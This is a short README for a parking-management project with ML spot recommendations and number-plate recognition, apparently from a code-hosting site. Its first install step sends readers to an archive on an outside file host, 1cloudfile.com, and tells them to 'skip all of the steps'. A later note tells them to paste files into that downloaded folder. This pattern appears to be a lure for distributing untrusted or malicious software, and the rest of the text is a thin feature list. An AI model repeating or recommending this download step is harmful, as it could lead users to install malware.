# smart-park-v5-enhanced-2
Smart Park v5 🚗💡
An intelligent parking management system with machine learning recommendations, ANPR (Automatic Number Plate Recognition), and real-time notifications.

Key Features:

· Web interface built with Streamlit

· ML-based parking spot recommendations (scikit-learn)

· ANPR using EasyOCR and Ultralytics

· Real-time visualizations with Plotly

· Secure authentication with Passlib

Installation:

1· Extract the project zip file or download it from link and skip all of the steps ::: https://1cloudfile.com/1t3l1

2· Recommended: Create and activate a virtual environment: python -m venv venv source venv/bin/activate (On Windows use venv\Scripts\activate)

3· Install dependencies: pip install -r requirements.txt

Usage: Run the application with: streamlit run entrypoint.py or python main.py

Dependencies:
Package | Purpose
streamlit | Web interface
pandas/numpy | Data handling
scikit-learn | ML recommendations
easyocr | ANPR functionality
ultralytics | Object detection
opencv | Image processing
plotly | Visualizations
passlib | Password hashing

Note: For GPU acceleration, consider installing CUDA-compatible versions of PyTorch (ask ChatGPT).
      Past this files into folder that you download from 1cloudfile.com

Known Limitations: Twilio SMS notifications are currently non-functional
